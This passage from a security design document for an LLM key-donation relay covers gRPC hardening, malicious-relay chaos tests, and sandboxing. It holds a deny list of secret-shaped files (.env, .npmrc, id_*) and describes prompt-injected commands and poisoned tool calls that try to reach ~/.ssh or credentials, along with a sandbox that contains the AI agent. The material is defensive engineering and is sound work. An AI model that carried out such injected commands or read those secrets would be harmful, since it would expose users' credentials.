| Token placement | `moochy connect --write` writes tokens only to **user-scoped** config files, or uses environment-variable indirection, or the stdio shim (authenticated by the 0600 local socket, no token needed). It refuses to write a token into any file tracked by git |
| DNS-rebinding defense | Rejects requests whose `Host` is not the loopback address and port; no CORS headers |
| MCP `files` | Allowed root = the git top-level recorded with the token at `moochy connect`, intersected with the client's MCP roots (or the shim's working directory when the client sends none); every path resolved with realpath and required to stay inside after resolution; symlinks refused; `.git/**` and secret-shaped files (`.env*`, `.npmrc`, `.netrc`, `*.pem`, `id_*`, `*.kdbx`) denied even when tracked; git-ignored files refused; total size capped (2 MiB default) |
| Secret scrubber | Before sealing (request bodies and MCP files): high-confidence patterns (cloud keys, private-key blocks, provider API keys, JWTs, `.env`-style assignments of known secret names) replaced with `[REDACTED:type]`; mode `redact` (default) or `warn` |
| Tool-call checks + tripwire | §8; proved by E18 |
| Terminal output | Every server-provided string (handles, repo names, model names, error details) is printed with control characters escaped (T25) |
| Own-key fallback (optional) | If the pool cannot serve, the Gateway can call the provider directly with the maintainer's own local key. Off by default |

---

## 14. Provider terms and legal guardrails

This section is for counsel review in Phase 0. It is not legal advice.

- **API keys only.** Consumer subscription credentials (chat-app logins, subscription OAuth tokens) are **refused technically**: adapters accept only API-key authentication against official API hosts.
- **The donor is the provider's customer of record.** The donor's terms with their provider govern the calls their key makes. Moochy's terms state this, and onboarding obtains explicit consent ("Requests from maintainers of repos that approve you will be sent to your provider under your account and its usage policies").
- Each provider's commercial terms and usage policies (Anthropic, OpenAI, OpenRouter, DeepSeek, xAI, every vetted host) must be reviewed for (a) serving third-party end users through one's own key, with end-user attribution like `metadata.user_id`; (b) resale restrictions (Moochy involves **no payment** between donor and maintainer and takes no cut, which matters here); (c) abuse-handling expectations.
- **Moochy never holds donors' or maintainers' money, ever.** It is free, takes no commission, and has no paid tier, which avoids payment, escrow, and tax regimes entirely. The project's own hosting is covered by open sponsorship with public accounts ([10 §10](10-operations.md)).

---

## 15. Research track: verified compute (free, opt-in)

Signatures prove *who* claimed something, not *what the provider actually returned*. Two technologies could close that gap later, offered as an **opt-in verified mode, free like everything else**:

| Approach | How it would work in Moochy | Status / cost |
|---|---|---|
| **TLS notarization (TLSNotary / MPC-TLS family)** | The Worker's TLS session to the provider runs jointly with a notary via MPC. **The Relay can act as the notary** and still learn nothing about the plaintext. The Worker gets an attestation that the response came from the provider's TLS server and discloses it selectively to the Gateway | Real and improving; currently adds significant bandwidth and latency per session. Fits small requests, not every streamed agent turn |
| **Trusted execution (confidential VMs)** | Workers run in attested enclaves; the Gateway verifies the attestation before sealing | Not viable for home donors; possible for donor-owned cloud hosts |

The receipt has a reserved optional `attestation` field. Commitments already bind the response bytes, so an attestation can be added without breaking v1.

---

## 16. Transport security: the gRPC link

Earlier drafts used a custom WebSocket framing with a 23-byte binary frame header. ADR-33 replaced it with gRPC over HTTP/2 (`moochy.v1.NodeLink`, `spec/proto/moochy/v1/link.proto`): one typed schema for Go and Rust, and per-task flow control, cancellation, and deadlines for free. Payload security does not change with the transport: bodies and responses are AEAD ciphertext in `bytes` fields, and route headers, receipts, and projections are the exact signed JSON bytes. This section lists what the transport itself must guarantee (CONTRACT §12).

### 16.1 Connection, authentication, channel binding

- **TLS 1.3 only, ALPN `h2`.** No plaintext h2c anywhere except the local Unix sockets (§13). The Relay runs gRPC on its own listener (`relay serve --grpc-addr`), separate from the HTTP listener (`--addr`), so the gRPC server keeps its native HTTP/2 hardening.
- **One HTTP/2 connection = one authenticated session.** The Node opens `Session`; the Relay sends `Hello{nonce}`; the Node answers `Auth{device_id, roles, sig}` with `sig = Ed25519(dev_key, lp("moochy/v1/auth", nonce, dialed_origin, tls_exporter, device_id))`; the Relay replies `Welcome{session_id}`.
- **`dialed_origin`** is the exact origin the Node dialed for the gRPC link, scheme included: `https://host:port`. A relay that forwards a stolen signature to another origin fails verification (T12).
- **`tls_exporter`** is the RFC 9266 value (`EXPORTER-Channel-Binding`, empty context, 32 bytes) of **this** TLS connection. Go tags every connection with an id and its exporter through a custom `credentials.TransportCredentials`; Rust captures it in a custom tonic connector built on `tokio-rustls`. A signature therefore cannot be replayed on any other connection.
- **Streams are bound to the connection.** `Submit` and `Serve` streams are accepted only on the same underlying connection as the authenticated `Session` and must carry `x-moochy-session`; streams from any other connection get `UNAUTHENTICATED`. On any transport error the Node rebuilds the channel and authenticates again.
- **Ed25519 verification is ZIP-215** in both languages (`ed25519-zebra` in Rust, `github.com/hdevalence/ed25519consensus` in Go), so Go and Rust never disagree on whether an edge-case signature is valid. Signing is plain RFC 8032.

### 16.2 gRPC / HTTP/2 hardening (all mandatory, all tested)

| Control | Setting | Against |
|---|---|---|
| Stream-open and reset rate limit per connection | Bounded; abusive connections closed | HTTP/2 **Rapid Reset** (CVE-2023-44487) |
| HTTP/2 library versions | Current grpc-go / `x/net` with the 2024 **CONTINUATION-flood** fixes | Unbounded header continuation |
| Header limits | `MaxHeaderListSize` 16 KiB; HPACK table limits | HPACK bombs, header floods |
| Message size | `MaxRecvMsgSize` / `MaxSendMsgSize` 128 KiB (a ciphertext chunk is ≤ 64 KiB, plaintext ≤ 65,497 B) | Memory exhaustion |
| Streams per connection | `MaxConcurrentStreams` 128 (Worker `slots_max` ≤ 64 + Gateway ≤ 16 concurrent tasks + `Session`, with margin) | Stream exhaustion |
| Keepalive | Enforcement `MinTime` 10 s, `PermitWithoutStream` true; server pings every 15 s, 2 missed = dead | Ping floods, half-dead connections |
| Per-IP caps | Connection cap per IP; `DeviceStart` / `DevicePoll` rate-limited per IP | Connection floods, device-code brute force |
| Pre-auth work | Unauthenticated calls other than `Session` / `Device*` rejected before any task state is allocated | Cheap amplification |
| Introspection | gRPC **reflection and channelz disabled** in production; `grpc.health.v1` allowed | Reconnaissance |
| Compression | No gRPC compression | CRIME-style oracles next to secrets; ciphertext does not compress anyway |
| Client side (Rust) | Same message-size caps, `http2_max_header_list_size`, connect and request timeouts, bounded per-stream buffers | Hostile or compromised relay |

### 16.3 Errors and the parser-differential rule

- Relay **policy** errors travel as `Failed{code, retryable}` (Gateway side) or are answered by the Worker's `Nack{code, …}` inside the stream; gRPC status codes are reserved for transport and auth (`UNAUTHENTICATED`, `RESOURCE_EXHAUSTED`, `UNAVAILABLE`, `DEADLINE_EXCEEDED`). The Gateway maps policy codes to provider-native errors ([03 §10.3](03-wire-protocol.md)): `over_task_cap` → HTTP 400 `invalid_request_error`, `quota_exceeded` → HTTP 403 `permission_error`, both non-retryable. **Never 429** for a policy error, because agents retry 429.
- **Protobuf is never trusted for strict security decisions.** proto3 parsers merge repeated singular fields (last wins), which is exactly the kind of ambiguity a parser-differential attack uses (T27). Every security or money decision reads the signed JSON bytes carried verbatim in `bytes` fields (route header in `SubmitOpen.route` / `Assign.route`, receipts, projections) with the strict parser of CONTRACT §1.

---

## 17. Client defences proved by a malicious relay (chaos scenarios)

The Relay is the party users are asked **not** to trust (A3), so the E2E suite runs a relay that misbehaves on purpose (`relay serve --dev`, `POST /dev/chaos`, loopback only) and checks that the **clients** hold the line. These are part of the current definition of "working" (CONTRACT §8), not later phases.

| Scenario | Chaos switch | What the relay does | What must happen |
|---|---|---|---|
| E11 | `ignore_caps` | Skips every pledge and member cap check | The Worker's local device cap still refuses work beyond the cap |
| E15 | `tamper_route` | Flips one byte of the route header sent to the Worker | The Worker refuses with `bad_envelope` (route header is the HPKE AAD and is covered by the task signature); provider never called; zero spend |
| E16 | `replay_assign` | Delivers the same assignment twice | The second delivery is refused with `unauthorized_task`; the provider is called once |
| E17 | `inject_frame` | Injects a forged `Chunk` into the victim Gateway's **own live `Submit` stream** | The Gateway fails the task on the first AEAD failure, logs `bad_envelope`, and returns a native retryable error; no forged byte reaches the client |

E17 injects into the victim's own stream on purpose (D8): a chunk sent on a different connection would be rejected by the Relay's per-connection stream binding (§16.1) before it ever reached the Gateway, which would test the Relay instead of the client.

**Served-task set (D18), the defence behind E16.** The Worker keeps `(gateway_device, task_id)` pairs in memory for the ±10 minute ULID freshness window, plus a **boot-time floor**: it refuses any task whose ULID timestamp is earlier than its own process start. Replay across restarts is therefore impossible without writing the set to disk, and there is no fsync in the hot path (the Worker's Assign → Ack budget is ≤ 1 ms p50, CONTRACT §13). Earlier drafts persisted the set; the boot-time floor gives the same guarantee for free.

---

## 18. Sandboxing (CONTRACT §15)

**The donor computes, the maintainer executes.** The output-injection risk (T8) cannot be removed by checks alone, because a malicious donor controls its output completely. So the design contains it with a sandbox on the maintainer's side, and removes every reason for the donor's machine to execute anything.

| Side | Mechanism | What it stops |
|---|---|---|
| Maintainer | `moochy run -- <agent>` ([07 §15](07-client-cli.md)): namespaces + Landlock + seccomp on Linux, Seatbelt on macOS; worktree-only filesystem with secret and git-ignored files masked, every `.git` read-only (commits after review, `--git-writable` keeps hooks and config read-only); no network except the gateway and exact `--allow-host` names over a CONNECT proxy (public addresses only); clean environment; resource limits; the tree dies with the run. Fails closed; `--unsafe-no-sandbox` only for debugging | A poisoned tool call or prompt-injected command reaching `~/.ssh`, cloud credentials, the Moochy keystore, other repos, the network, or the host's next `git commit` |
| Maintainer | Run tokens: pooled tool calls are released only to sessions holding a live `moochy run` token; others get text plus a `[moochy]` notice unless the project sets `allow_unsandboxed_tools` (warned at every start) | Tool calls from donated tokens reaching an unsandboxed agent by default |
| Maintainer | Gateway re-emits every streamed event from its typed form (canonical JSON, normalized SSE); pure-Rust decompression with a 32 MiB cap; terminal control sequences stripped | Parser-differential and terminal-escape attacks through donor bytes |
| Maintainer | Excluded providers per project (`PoolSync.excluded_providers`) | Content reaching a provider the project does not accept (e.g. data retention) |
| Donor | `lockdown_self`: after start-up the background process loses `exec`, `ptrace`, `mount`, `bpf` and similar syscalls, is limited to its state dir, and (Landlock net ABI ≥ 4) may connect only to 443 and the relay port. Refuses to serve if the lockdown fails | A compromised Worker (parser bug, malicious request) running programs, reading other files, or exfiltrating elsewhere |
| Donor | One pre-spawned, single-use validator child per request (no files, no network, no keys, seccomp allowlist) parses and firewalls the opened request | A malicious request exploiting the decompressor or JSON parser with access to keys or the network |
| Donor | No C code on hostile input (`ruzstd`); dedicated provider key with a provider-side spend limit | Memory-safety bugs in C decoders; any residual bug costing more than the provider limit |

Known limits: a donor can still return wrong or low-quality answers (a quality problem handled by receipts, disputes, and owner approval), and text can still try to persuade the human. Same-user malware outside the sandbox is out of scope (T14). Verification: E93+ and E96 (CONTRACT §15.3), plus mo-sec escape tests.

